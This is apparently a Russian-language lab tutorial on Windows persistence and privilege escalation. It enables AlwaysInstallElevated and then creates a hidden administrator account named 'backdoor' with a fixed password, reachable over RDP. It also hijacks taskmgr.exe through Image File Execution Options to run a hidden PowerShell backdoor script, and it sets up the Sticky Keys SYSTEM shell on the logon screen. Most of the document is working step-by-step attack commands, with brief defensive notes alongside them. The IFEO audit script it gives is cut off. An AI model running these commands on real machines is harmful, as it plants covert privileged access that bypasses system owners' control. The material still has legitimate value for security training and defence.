### Включение AlwaysInstallElevated

**AlwaysInstallElevated** - политика Windows, которая разрешает устанавливать **MSI**-пакеты с правами **SYSTEM** для любого пользователя, включая непривилегированных. Если оба ключа (в **HKLM** и **HKCU**) установлены в значение 1 - любой **MSI**-файл запустится с максимальными привилегиями.

Включаем через **PowerShell**:

- Создаём новый раздел на уровне системы: `New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force`
- Добавляем параметр **AlwaysInstallElevated** со значением **1**: `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -Type DWord`
- Создаём новый раздел на уровне пользователя: `New-Item -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force`
- Добавляем параметр **AlwaysInstallElevated** со значением **1**: `Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -Type DWord`

![](../../_images/f687cb940bcb.webp)

Политика включена - теперь посмотрим как атакующий использует её для получения привилегий **SYSTEM**.

### Атака AlwaysInstallElevated

#### Теория

**AlwaysInstallElevated** - уязвимость конфигурации, при которой **Windows Installer** (**msiexec.exe**) запускает любой **MSI**-пакет с привилегиями** SYSTEM** вне зависимости от того, кто инициировал установку.

**Почему MSI запускается с правами SYSTEM:** Windows Installer - привилегированная системная служба. Когда включён **AlwaysInstallElevated**, служба не проверяет права пользователя и передаёт процессу установки токен **SYSTEM**. Атакующий упаковывает вредоносный код в легитимный формат **MSI** - и Windows сама запускает его с максимальными правами.

**Условия успеха:**

- Оба ключа реестра **AlwaysInstallElevated** установлены в **1**
- Возможность запустить MSI-файл на целевой машине

**Инструменты:**

- **msfvenom** - генерация вредоносного MSI
- **Metasploit** - модуль **exploit/windows/local/always_install_elevated**
- **PowerUp.ps1** - автоматическое обнаружение и эксплуатация

**Защита:** Отключение хотя бы одного ключа

- HKLM: `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0 -Type DWord`
- HKCU: `Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0 -Type DWord`

#### Создание и скрытие пользователя через реестр

##### Теория

Создание скрытого привилегированного пользователя - классический механизм persistence. Атакующий, получив временный доступ к системе, создаёт бэкдорную учётную запись с правами администратора, скрывает её от экрана входа и использует для возврата в систему через удалённые протоколы.

**Методика создания бэкдорной учётной записи:**

1. Создать новую локальную учётную запись
2. Добавить в группу **Administrators**
3. Добавить в группу **Remote Desktop Users** для доступа по RDP
4. Включить RDP и открыть порт в брандмауэре
5. Скрыть учётную запись через реестр

**Защита:**

- Мониторить аномальных пользователей: `net user`
- При обнаружении удалять: `net user <имя пользователя> /delete`

#### Практика

Создаём локального пользователя в **cmd**: `net user backdoor P@ssw0rd123 /add`

![](../../_images/e873a528a935.webp)

Добавляем в группу **Administrators**: `net localgroup Administrators backdoor /add`

![](../../_images/1f48ba3ec35c.webp)

Добавляем в группу **Remote Desktop Users**: `net localgroup "Remote Desktop Users" backdoor /add`

![](../../_images/bf233b02e2c1.webp)

Включаем **RDP** в реестре через **PowerShell** и открываем порт:

- Разрешаем подключение через **RDP**: `Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Type DWord`
- Открываем порт для **RDP**-соединения: `New-NetFirewallRule -DisplayName "RDP (TCP-In)" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow`
- Включаем правила: `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
- Перезагружаем компьютер: `Restart-Computer`

![](../../_images/91e2f9eb9a07.webp)

Узнаём IP-адрес Windows: `ipconfig`

![](../../_images/069d1c2a5abf.webp)

На Linux устанавливаем **xfreerdp**: `apt install freerdp2-x11`

![](../../_images/0dcd1e044593.webp)

Подключаемся к Windows: `xfreerdp /v:192.168.0.188 /u:backdoor /p:P@ssw0rd123 /cert-ignore`

где:

1. **/v:** - IP-адрес атакуемой машины
2. **/u:** - имя пользователя, под которым подключаемся
3. **/p:** - его пароль
4. **/cert-ignore** - игнорируем ошибки сертификата

![](../../_images/07381b969060.jpg)

Мы успешно подключились

![](../../_images/dc936ff6f9ae.webp)

Теперь, получив доступ, скрываем пользователя с окна входа:

- Создаём ветку **SpecialAccounts**: `New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force`
- Создаём ветку **UserList** внутри **SpecialAccounts**: `New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force`
- Добавляем нашего пользователя со значением 0: `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "backdoor" -Value 0 -Type DWord`

![](../../_images/ccd40f803dff.webp)

Перезагружаем компьютер и в списке пользователей мы не увидим аккаунт **backdoor**, но сможем подключиться через него по **RDP**

![](../../_images/8d6164650093.webp)

#### Image File Execution Options

##### Теория

**Image File Execution Options (IFEO)** - раздел реестра, изначально предназначенный для разработчиков: позволяет автоматически запускать отладчик при старте указанного исполняемого файла. Windows перехватывает запуск программы и вместо неё запускает то, что указано в ключе **Debugger**.

Путь в реестре: **HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options<имя_файла.exe>**

**Легитимное использование:** разработчик указывает **windbg.exe** как отладчик для своего приложения - при каждом запуске приложения автоматически открывается отладчик.

**Нелегитимное использование:**

| Сценарий | Описание |
|---|---|
| Persistence | Прописать свой бэкдор как "отладчик" для часто запускаемой системной утилиты. Каждый раз когда пользователь или система запускает эту утилиту - запускается и бэкдор |
| Перехват системных инструментов | Подменить taskmgr.exe , regedit.exe , cmd.exe - при их открытии запустится вредоносный код |
| Sticky Keys бэкдор | Прописать cmd.exe как отладчик для sethc.exe (Sticky Keys). На экране входа пятикратное нажатие Shift открывает командную строку с правами SYSTEM |

**Защита:** Проверять все существующие IFEO-записи с ключом Debugger:

```
$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" 
$keys = Get-ChildItem $ifeoPath 
foreach ($key in $keys) {
$debugger = (Get-ItemProperty -Path $key.PSPath -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
if ($debugger) {
Write-Host "Найдено: $($key.PSChildName) -> $debugger" -ForegroundColor Red

```

#### Практика

##### Перехват запуска taskmgr.exe

В **PowerShell** создаём ключ для **taskmgr.exe**: `New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" -Force`

Прописываем **cmd.exe** как "отладчик": `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" -Name "Debugger" -Value "cmd.exe"`

![](../../_images/0af6cc394267.webp)

Теперь при каждом запуске **Task Manager** вместо него будет открываться **cmd**

![](../../_images/7e9a60d1d9b7.webp)

##### Persistence через IFEO: бэкдор на taskmgr.exe

Создаём файл **backdoor.ps1** в **C:\Windows\Temp\**:

```
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

![](../../_images/89d61383e22b.jpg)

> Скрипт создаёт пользователя **backdoor** с паролем **P@ssw0rd123**, добавляет его в группы **Administrators** и **Remote Desktop Users**, разрешает подключение по **RDP** и открывает соответствующее правило в брандмауэре.

Прописываем **backdoor.ps1** как "отладчик" без видимого окна и с отключением проверки политики выполнения скриптов: `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" -Name "Debugger" -Value "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\backdoor.ps1"`

![](../../_images/2b68c2a72551.webp)

Теперь каждый раз, как любой пользователь будет запускать **Task Manager**, будет выполняться скрипт. Для проверки:

- Удаляем пользователя backdoor: `net user backdoor /delete`
- Проверяем, что он удалился: `net user`
- Запускаем Task Manager и снова проверяем наличие пользователя: `net user`

![](../../_images/db1c2e595602.webp)

##### Sticky Keys бэкдор

Суть атаки: доступ к командной строке с правами **SYSTEM** прямо с экрана входа без аутентификации. **sethc.exe** - программа **Sticky Keys**, запускается при пятикратном нажатии **Shift**. Работает на экране входа до аутентификации пользователя и запускается от имени **SYSTEM**.

В **PowerShell** создаём ключ для **sethc.exe**: `New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force`

![](../../_images/8249c21862ce.webp)

Прописываем **cmd.exe** как отладчик **sethc.exe**: `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name "Debugger" -Value "C:\Windows\System32\cmd.exe"`

![](../../_images/540391fd7d26.webp)

Выходим из системы и нажимаем 5 раз **Shift** - мы увидим cmd. Проверяем, от какого пользователя запущена командная строка: `whoami`

![](../../_images/81417f2cd5d6.webp)
